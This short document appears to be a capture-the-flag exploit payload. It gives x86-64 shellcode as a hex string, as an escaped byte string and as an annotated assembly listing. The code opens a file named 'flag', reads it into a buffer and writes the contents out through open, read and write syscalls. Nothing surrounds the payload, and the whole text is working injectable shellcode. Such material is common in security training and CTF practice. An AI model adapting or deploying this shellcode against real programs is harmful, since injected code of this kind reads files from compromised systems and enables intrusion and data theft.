4831F64831D248C7C7666C6167574889E7480500010000505048C7C0020000000F054889C74831C05E48C7C2000100000F0548C7C00100000048C7C7000000005E48C7C2300000000F05
"\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC7\x66\x6C\x61\x67\x57\x48\x89\xE7\x48\x05\x00\x01\x00\x00\x50\x50\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\x31\xC0\x5E\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x00\x00\x00\x00\x5E\x48\xC7\xC2\x30\x00\x00\x00\x0F\x05"
xor    rsi,rsi
xor    rdx,rdx
mov    rdi,0x67616c66
push   rdi
mov    rdi,rsp
add    rax,0x100;buffer
push   rax
push   rax
mov    rax,0x2
syscall		;open
mov    rdi,rax
xor    rax,rax
pop    rsi
mov    rdx,0x100
syscall		;read
mov    rax,0x1
mov    rdi,0x00	;output fd
pop    rsi
mov    rdx,0x30
syscall		;write
